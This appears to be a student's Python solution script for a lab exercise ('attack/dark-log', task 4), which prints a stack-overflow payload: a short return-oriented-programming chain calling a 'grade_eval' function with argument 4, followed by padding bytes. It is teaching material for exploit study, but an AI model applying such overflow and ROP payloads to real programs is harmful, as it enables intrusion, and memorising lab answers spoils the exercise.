#!/usr/bin/env python3
"""Task 4: build the payload for attack/dark-log.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys

payload = (
    b"\xa3\x18\x40\x00\x00\x00\x00\x00"  # pop rdi; ret
    b"\x04\x00\x00\x00\x00\x00\x00\x00"  # 参数 4
    b"\xa4\x18\x40\x00\x00\x00\x00\x00"  # ret，调整栈对齐
    b"\x77\x16\x40\x00\x00\x00\x00\x00"  # grade_eval
    b"\x00\x00\x00\x00\x00\x00\x00\x00"  # grade_eval 返回后的地址（尚未处理）
    + b"A" * 88
    + b"B" * 128
    + b"\xc8\x00\x00\x00"
)

sys.stdout.buffer.write(payload)
